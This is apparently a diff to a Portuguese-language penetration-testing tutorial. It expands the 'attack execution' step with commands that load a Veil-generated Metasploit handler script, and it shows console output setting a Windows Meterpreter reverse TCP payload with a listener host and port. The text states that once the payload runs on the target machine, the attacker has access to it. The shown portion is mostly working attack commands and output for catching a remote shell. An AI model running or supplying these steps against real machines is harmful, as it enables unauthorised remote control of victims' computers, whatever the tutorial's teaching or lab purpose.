@@ -216,7 +216,31 @@ Na GUI
 
 ## Execução do ataque
 
-Após o entregar o payload, entre no Metasploit e execute o /var/lib/veil/output/handlers/plveil.rc
+Após o entregar o payload, execute o script  /var/lib/veil/output/handlers/plveil.rc no metasploit-framework:
 
+`$ msfconsole -r /var/lib/veil/output/handlers/plveil.rc`
+
+ou 
+
+`msf6 > resource /var/lib/veil/output/handlers/plveil.rc`
+```
+[*] Processing /var/lib/veil/output/handlers/plveil.rc for ERB directives.
+resource (/var/lib/veil/output/handlers/plveil.rc)> use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+resource (/var/lib/veil/output/handlers/plveil.rc)> set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+resource (/var/lib/veil/output/handlers/plveil.rc)> set LHOST 192.168.1.10
+LHOST => 192.168.1.10
+resource (/var/lib/veil/output/handlers/plveil.rc)> set LPORT 4444
+LPORT => 4444
+resource (/var/lib/veil/output/handlers/plveil.rc)> set ExitOnSession false
+ExitOnSession => false
+resource (/var/lib/veil/output/handlers/plveil.rc)> exploit -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.1.10:4444 
+msf6 exploit(multi/handler) > 
+```
 Quando o playload for executado na máquina alvo, teremos acesso a ela.
 
